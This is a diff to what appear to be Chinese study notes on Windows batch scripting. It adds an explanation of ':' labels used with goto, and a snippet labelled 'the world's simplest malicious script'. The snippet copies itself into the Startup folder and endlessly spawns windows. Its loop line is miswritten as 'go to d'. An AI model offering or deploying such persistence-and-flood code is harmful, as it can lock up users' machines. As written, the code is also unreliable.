@@ -6,6 +6,25 @@
 //批处理的扩展名为".bat"。
 //批处理脚本先后顺序很重要，从上往下严格执行每一条命令。
 
+/*":"用来给若干个命令划分区号，每个":"开头都是一个区块。例如:
+:1
+cmdcmd
+cmdcmd
+:2
+cmdcmd
+cmdcmd
+cmdcmd
+:3
+cmdcmdcmdcmd
+*/
+":"一般配合"goto"使用，如果单独使用没有任何意义。
+
+世界上最简单的恶意脚本
+copy filename.bat C:\Users\felipew\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup //可以在win+r中输入"shell:startup"找到。
+:d
+start
+go to d
+
 
 @echo off //屏蔽了执行过程，以达到让下面三个echo输出在cmd执行框里视觉上有更美观的效果。
 color (参数) //cmd中输入"color ?"以查看不同的颜色对应的十六进制位。
